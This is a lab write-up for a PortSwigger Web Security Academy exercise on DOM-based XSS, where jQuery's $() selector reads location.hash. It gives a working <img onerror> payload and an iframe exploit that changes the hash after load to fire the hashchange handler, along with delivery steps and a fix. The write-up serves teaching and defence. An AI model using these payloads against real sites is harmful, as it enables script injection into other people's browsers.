# PortSwigger — DOM XSS in jQuery Selector Sink Using a Hashchange Event

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The home page uses jQuery's `$()` selector function to auto-scroll to a blog post whose title is read from `location.hash`. When the hash value starts with `<`, jQuery interprets it as raw HTML instead of a CSS selector and injects it into the DOM. Because the victim must trigger the `hashchange` event, the exploit is delivered via an `<iframe>` that modifies its own `src` after loading, silently changing the hash and firing `print()` in the victim's browser.

**Lab URL:** `https://0a8c0002042c6409809a304f007700be.web-security-academy.net/`

---

## Challenge Description

> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
>
> To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — DOM-based**
- Goal: Deliver an exploit to the victim that triggers `print()` in their browser

---

## Recon

### Step 1 — Identify the source and sink

Inspecting the page's JavaScript source reveals the vulnerable snippet:

```javascript
$(window).on('hashchange', function() {
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
    post[0].scrollIntoView();
});
```

- **Source:** `location.hash` — fully attacker-controlled via the URL fragment
- **Sink:** jQuery's `$()` selector function — the hash value is passed directly as a selector string

### Step 2 — Understand how jQuery's `$()` becomes a sink

jQuery's `$()` function has a dual behaviour depending on the input it receives:

| Input starts with... | jQuery interprets it as... | Result |
|---|---|---|
| A CSS selector (e.g. `h2`) | A DOM query | Searches the document |
| `<` (angle bracket) | An HTML string | **Parses and injects HTML into the DOM** |

This means that passing `<img src=x onerror=print()>` to `$()` causes jQuery to create and insert a real `<img>` element into the document — triggering `onerror` when the image fails to load.

### Step 3 — Confirm the vulnerability manually

Navigate to the lab and append the following to the URL:

```
#<img src=x onerror=print()>
```

Full URL:
```
https://0a8c0002042c6409809a304f007700be.web-security-academy.net/#<img src=x onerror=print()>
```

The `hashchange` event fires, jQuery receives the `<img>` string, injects it into the DOM, the image load fails, and `print()` executes. Vulnerability confirmed ✅

---

## Exploitation

### Step 4 — Understand why a direct link is not enough

A naive approach would be to send the victim a URL with the malicious hash directly:

```
# ❌ Does not reliably work for delivering to a victim:
https://0a8c0002042c6409809a304f007700be.web-security-academy.net/#<img src=x onerror=print()>
```

Two problems make this unreliable:

1. **The hash is never sent to the server** — it lives entirely client-side, so server-side redirects cannot be used.
2. **`hashchange` does not fire on the initial page load** — the event only triggers when the hash *changes* after the page is already loaded. Simply landing on the URL with a hash does not fire the event in all browsers.

A page that loads first and then *programmatically changes* the hash is required.

### Step 5 — Craft the exploit using an iframe

The exploit uses an `<iframe>` that:
1. Loads the target page with an empty hash (`#`) on the first load
2. Fires `onload` once the page is ready
3. Appends the malicious payload to `src`, changing the hash from `#` to `#<img src=x onerror=print()>`
4. This hash change fires the `hashchange` event inside the iframe → jQuery executes → `print()` is called

```html
<iframe
  src="https://0a8c0002042c6409809a304f007700be.web-security-academy.net/#"
  onload="this.src+='<img src=x onerror=print()>'"
>
</iframe>
```

### Step 6 — Execution flow

```
Victim opens the exploit page
        ↓
<iframe> loads the lab home page with src ending in "#"
        ↓
onload fires → this.src is updated, appending "<img src=x onerror=print()>"
        ↓
The iframe's hash changes → hashchange event fires inside the iframe
        ↓
jQuery receives: $('<img src=x onerror=print()>')
        ↓
jQuery parses the string as HTML → <img> element created and injected into the DOM
        ↓
Browser attempts to load src="x" → fails (invalid URL)
        ↓
onerror handler fires → print() executes in the victim's browser
        ↓
LAB SOLVED ✅
```

---

## Delivering the Exploit

1. Click **"Go to exploit server"** in the lab interface
2. Paste the following in the **Body** field:

```html
<iframe
  src="https://0a8c0002042c6409809a304f007700be.web-security-academy.net/#"
  onload="this.src+='<img src=x onerror=print()>'"
>
</iframe>
```

3. Click **"Store"** to save the exploit
4. Click **"View exploit"** to test it on yourself — the browser's print dialog should appear ✅
5. Click **"Deliver exploit to victim"** — the lab is solved ✅

---

## Sink Comparison — jQuery `$()` vs innerHTML vs document.write

| Sink | Executes `<script>` | Handles raw HTML | Reliable XSS vector |
|---|---|---|---|
| `document.write()` | ✅ Yes | ✅ Yes | `<script>alert(1)</script>` |
| `innerHTML` | ❌ No (spec-blocked) | ✅ Yes | `<img src=x onerror=...>` |
| jQuery `$()` | ❌ No | ✅ Yes (when input starts with `<`) | `<img src=x onerror=...>` |
| `element.textContent` | ❌ No | ❌ No — plain text only | Not injectable |

---

## Key Takeaways

- **jQuery's `$()` is a dangerous sink** when fed user-controlled input — it silently switches from CSS selector mode to HTML parsing mode when the input begins with `<`
- **`location.hash` is a fully attacker-controlled source** — anything after `#` in the URL is available to JavaScript without any server interaction
- **`hashchange` doesn't fire on initial load** — delivering the exploit requires a page that first loads the target, then modifies the hash, which is precisely what the `onload` + `iframe` trick achieves
- **`<img src=x onerror=...>`** remains one of the most reliable XSS payloads: no server needed, guaranteed immediate error, no quotes required around attribute values
- **The fix:** never pass user-controlled data directly to jQuery's `$()` selector. Validate or sanitise `location.hash` before use, and prefer `document.querySelector()` with a strict allowlist of selector values

---

## References

- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger — jQuery `$()` selector sink](https://portswigger.net/web-security/cross-site-scripting/dom-based#jquery-selector-sink-using-a-hashchange-event)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [jQuery — Security considerations](https://api.jquery.com/jquery/#jQuery-selector-context)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)